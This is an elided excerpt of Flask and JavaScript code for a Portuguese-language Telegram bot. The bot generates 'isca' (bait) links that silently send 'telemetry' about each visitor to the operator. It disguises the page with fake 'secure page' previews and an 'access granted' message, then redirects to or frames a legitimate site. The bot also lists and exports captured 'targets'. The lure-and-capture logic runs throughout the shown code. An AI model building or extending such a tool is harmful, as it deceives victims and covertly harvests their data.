            ...
            fetch('/api/telemetry', {
                ...
                setTimeout(() => {
                    if (targetRedirect && targetRedirect !== "None" && targetRedirect !== "") {
                        ...
                        document.body.innerHTML = '<div style="text-align:center;font-family:sans-serif;color:white;padding-top:20vh;"><h1>✅ Acesso Liberado</h1><p>Você já pode fechar esta página.</p></div>';
                    }
                }, 1000);
            });
        }
...
def isca():
    ...
    og_title = request.args.get('title', 'Carregando Página Segura...')
    og_desc = request.args.get('desc', 'Aguarde um instante...')
    ...
    while True:
        try:
            ...
            for result in data.get("result", []):
                ...
                # Tratamento para Botões Inline (callback_query) e Comandos normais de texto
                if "callback_query" in result:
                    ...
                    if data_action == "btn_link":
                        enviar_mensagem_telegram(chat_id, "🔗 *Uso do Link Padrão:*\nEnvie `/link` para gerar a isca base.")
                    elif data_action == "btn_iframe":
                        enviar_mensagem_telegram(chat_id, "🪞 *Uso de Iframe:*\nEnvie `/iframe https://site-legitimo.com`")
                    elif data_action == "btn_logs":
                        # Aciona a rotina de logs
                        executar_logs(chat_id)
                    elif data_action == "btn_bloco":
                        # Aciona a rotina de exportação do bloco
                ...
                # Teclado Inline Moderno
                inline_markup = {
                    "inline_keyboard": [
                        [{"text": "🔗 Gerar Link Padrão", "callback_data": "btn_link"},
                ...
                if text in ["/start", "/menu"]:
                    menu_texto = (
                        ...
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "Selecione uma das opções abaixo nos botões interativos ou digite diretamente:\n\n"
                        "• `/link <URL>` — Redirecionamento seguro pós-captura.\n"
                        "• `/iframe <URL>` — Carregamento em tela cheia via iframe.\n"
                        "• `/logs` — Exibir histórico de alvos.\n"
                        "• `/bloco` — Baixar JSON completo."
                    )
                    ...
                    if len(partes) > 1 and partes[1].startswith("http"):
                        url_alvo = partes[1]
                        # Correção de codificação: codificamos corretamente a URL de redirecionamento como parâmetro limpo `to`
                        link_customizado = f"{dominio_base}/isca/verificacao?to={urllib.parse.quote(url_alvo, safe='')}"
                        
                        link_msg = (
                            "🔗 *Link de Isca Configurado com Sucesso!*\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            "O link abaixo executa a telemetria em background e redireciona perfeitamente para o site desejado:\n\n"
                            f"`{link_customizado}`"
                        )
                    else:
                        link_msg = (
                            "⚠️ *Formato Inválido*\n\n"
                            "Use o comando acompanhado de uma URL válida:\n"
                            "`/link https://www.efacil.com.br/...`"
                        )
                    ...
                    if len(partes) > 1 and partes[1].startswith("http"):
                        url_iframe = partes[1]
                        link_customizado = f"{dominio_base}/isca/verificacao?iframe={urllib.parse.quote(url_iframe, safe='')}"
                        link_msg = (
